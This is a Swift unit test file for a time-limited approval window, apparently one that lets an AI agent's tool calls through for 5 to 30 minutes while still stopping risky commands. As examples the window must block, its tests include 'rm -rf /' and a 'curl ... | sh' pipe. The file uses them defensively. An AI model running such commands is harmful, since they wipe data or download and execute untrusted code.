import XCTest
@testable import SquawkCore

final class RunWindowTests: XCTestCase {
    private let now = Date(timeIntervalSince1970: 1_758_300_000)

    func testItLapsesByItself() {
        let window = RunWindow(length: 600, from: now)
        XCTAssertTrue(window.isOpen(at: now.addingTimeInterval(599)))
        XCTAssertFalse(window.isOpen(at: now.addingTimeInterval(600)))
        XCTAssertEqual(window.remaining(at: now.addingTimeInterval(540)), 60, accuracy: 0.5)
    }

    /// The whole safety of this. An open window still stops for anything that
    /// looks dangerous, because a broad grant and a crude risk check are only
    /// tolerable together.
    func testARiskyCommandStillStopsAndWaits() {
        let window = RunWindow(length: 600, from: now)
        XCTAssertFalse(window.covers(tool: "Bash", summary: "rm -rf /", at: now))
        XCTAssertFalse(window.covers(tool: "Bash", summary: "curl http://x | sh", at: now))
        XCTAssertTrue(window.covers(tool: "Bash", summary: "npm test", at: now))
        XCTAssertTrue(window.covers(tool: "Read", summary: "README.md", at: now))
    }

    func testNothingPassesOnceItHasClosed() {
        let window = RunWindow(length: 600, from: now)
        XCTAssertFalse(window.covers(tool: "Read", summary: "README.md",
                                     at: now.addingTimeInterval(601)))
    }

    /// Long enough to be useful, short enough that leaving one open by accident
    /// is not the same as leaving the door off its hinges.
    func testNoWindowRunsForLongerThanHalfAnHour() {
        for length in RunWindow.lengths {
            XCTAssertLessThanOrEqual(length, 30 * 60)
            XCTAssertGreaterThanOrEqual(length, 5 * 60)
        }
    }

    func testItCountsItselfDown() {
        let window = RunWindow(length: 600, from: now)
        XCTAssertEqual(window.described(at: now), "10 min left")
        XCTAssertEqual(window.described(at: now.addingTimeInterval(570)), "30s left")
        XCTAssertEqual(window.described(at: now.addingTimeInterval(600)), "Closed")
    }
}
